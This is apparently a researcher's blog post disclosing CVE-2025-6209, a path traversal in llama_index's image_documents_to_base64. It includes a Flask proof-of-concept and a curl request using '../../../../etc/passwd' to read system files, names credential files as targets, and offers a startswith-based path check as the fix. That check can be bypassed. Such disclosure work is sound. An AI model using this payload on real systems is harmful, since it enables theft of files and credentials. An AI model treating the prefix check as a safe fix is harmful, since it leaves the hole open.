---
title: "Path Traversal in `run-llama/llama_index`"
date: 2025-08-17 11:46:44 +0530
categories:
  - AI/ML Research
tags:
  - AI/ML
  - CVE-2025-6209
  - Path Traversal
  - Open Source Library
image: "/assets/img/llama.png"
---
# When Your AI Library Reads `/etc/passwd` For You

*How I stumbled into a path traversal in `run-llama/llama_index` and got assigned [`CVE-2025-6209`](https://www.cve.org/CVERecord?id=CVE-2025-6209)*

There’s a funny thing about writing AI libraries these days. Everyone’s in a rush to ship features, wire things together, slap an `encode_image` or `to_base64` somewhere and move on. And in that hurry, the oldest vulnerabilities in the book keep sneaking back in.

This one? A **classic path traversal → arbitrary file read** in [`run-llama/llama_index`](https://github.com/run-llama/llama_index). Yeah, the same kind of bug we were pwning PHP forums with in 2003.

Except now it lives inside the plumbing of an “AI infra” library.

---

## The Setup

Buried in `generic_utils.py` was this innocent line:

```python
with open(image_path, "rb") as image_file:
    return base64.b64encode(image_file.read()).decode("utf-8")
```

Looks harmless, right? Pass it an image, get a base64 string.
But here’s the catch: **`image_path` is attacker-controlled.**

No sanitization. No directory whitelisting. No “hey maybe don’t open `/etc/shadow` as if it were a PNG.” Just raw `open()` on whatever string you throw at it.

And because this gets wrapped inside `ImageDocument` and passed down into `image_documents_to_base64`, suddenly you have a cute little API endpoint that will happily read **any file on the system** for you.

---

## Proof of Concept

I spun up a Flask app to simulate what a careless integration might look like:

```python
from flask import Flask, request
import base64
from llama_index.core.schema import ImageDocument
from llama_index.core.multi_modal_llms.generic_utils import image_documents_to_base64

app = Flask(__name__)

@app.route("/upload", methods=["POST"])
def upload_image():
    image_path = request.form.get("image_path")  # Attacker-controlled input
    doc = ImageDocument(image_path=image_path)
    try:
        encoded = image_documents_to_base64([doc])
        if encoded:
            return {"encoded": encoded[0], "decoded": base64.b64decode(encoded[0]).decode("utf-8")[:500]}
        return {"error": "No content returned"}
    except Exception as e:
        return {"error": str(e)}

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

Then I sent it this:

```bash
curl -X POST -F "image_path=../../../../etc/passwd" http://localhost:5000/upload
```

Boom. Base64-encoded contents of `/etc/passwd` in my terminal.
Not an image. Definitely not what the dev intended.

---

## Why This Matters

This is where it gets interesting. Most people will shrug:

> “Oh, it’s just `/etc/passwd`, no big deal.”

But here’s the reality:

* **Information Disclosure**: `/etc/passwd` isn’t the holy grail anymore, but `/etc/shadow` is. Or maybe it’s AWS creds in `~/.aws/credentials`. Or private keys lying around.
* **Privilege Escalation**: If the service runs as root (and let’s be real, a lot of quick AI servers do), then it’s game over.
* **Silent Data Leaks**: AI infra often sits inside bigger pipelines. Exfiltrating config files, API keys, or model weights becomes trivial.

This isn’t just “a bug.” It’s a door.

---

## Root Cause

The root cause is painfully simple:

1. Developer assumed input was “just an image path.”
2. No validation of path traversal (`../`) or absolute paths.
3. No restriction to a safe directory.

This isn’t new. This is **day-one AppSec**. But we keep making the same mistake because frameworks encourage “just pass a string, it’ll work.”

---

## The Fix

Lock it down:

```python
import os

def sanitize_path(image_path):
    absolute_path = os.path.abspath(image_path)
    allowed_root = "/path/to/images"
    if not absolute_path.startswith(allowed_root):
        raise ValueError("Invalid file path")
    return absolute_path
```

And maybe — just maybe — **don’t trust raw file paths from users in 2025.**

---

## Bigger Picture

This bug says more about the *state of AI dev culture* than the code itself.

* We’re gluing libraries together with zero threat modeling.
* Security reviews get skipped because “we need to ship the demo.”
* The same 90s-era bugs are resurfacing in 2025, wrapped in shiny AI wrappers.

As a hacker, it’s almost laughable. But also terrifying. Because this code runs in real production systems. Behind APIs. In companies storing sensitive data.

And attackers don’t need to invent fancy AI exploits when **path traversal still works**.

---

## Closing Thoughts

I’ve been hacking long enough to see patterns. The tools change, the hype changes, but the bugs? They’re eternal.

If you’re building with AI infra, don’t just ask “does it work?”
Ask: **what happens when someone pushes it sideways?**

Because if you don’t, someone else will.

PS: You can refer to this commit for changes pushed later on for patch.
[`Fix`](https://github.com/run-llama/llama_index/commit/cdeaab91a204d1c3527f177dac37390327aef274)

---

*Filed: [Arbitrary File Read via Path Traversal in `run-llama/llama_index`](https://huntr.com/bounties/e89d14f8-bfe8-4c9a-bb2a-656c01cc9a68) 

---
